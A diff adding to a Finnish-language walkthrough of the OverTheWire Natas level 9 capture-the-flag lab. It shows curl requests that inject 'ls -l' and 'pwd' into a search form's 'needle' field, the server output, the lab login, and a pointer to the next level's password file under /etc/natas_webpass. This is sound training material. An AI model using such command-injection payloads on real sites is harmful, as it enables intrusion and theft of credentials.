@@ -159,11 +159,54 @@ Tämä on se html formaatti lomake kenttä koodi;
             </form>
 ```
 
+Nyt muutettuna ja ainakin toimii tämä `ls -l` linux yleinen komento tarkistettaan hakemiston listauksia ja nykyisestä polusta. **Mitä tässä on muutettu?** Ennen `-d "secret=;ls -l;&submit=submit"` --> after ; `-d "needle=xyz;ls -l;&submit=submit"`
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -d "needle=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/ 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas9", "pass": "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" };</script></head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
 
 
+Output:
+<pre>
+total 460
+-rw-r----- 1 natas9 natas9 460878 Apr 10 14:18 dictionary.txt
+-rw-r--r-- 1 root   root     2924 Apr 10 14:18 index-source.html
+-rw-r----- 1 natas9 natas9   1185 Apr 10 14:18 index.php
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 
+Myös muita samankaltaisia toimivia komentoa;
+-  `curl -X POST -d "needle=;pwd;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`
 
+
+**Miksi tässä ei mainittu lisä vihjeitä?**
+
+Tämä on tahallista. Tästä tasosta eteenpäin *OverTheWire* alkaa siirtyä vähemmän kädestä pitäviin tehtäviin ja alkaa testata. Tässä level 9:ssä vaikka lähdekoodissa ei suoraan mainita salasanaa tai sen sijaintia, sen odotetaan löytyvän tiedostosta muodossa, mutta jatkossa voi olla jouduttaan käyttää tätä tallennettua tiedoston polkua `/etc/natas_webpass/natas10`.
+
+
+---
 
 
 
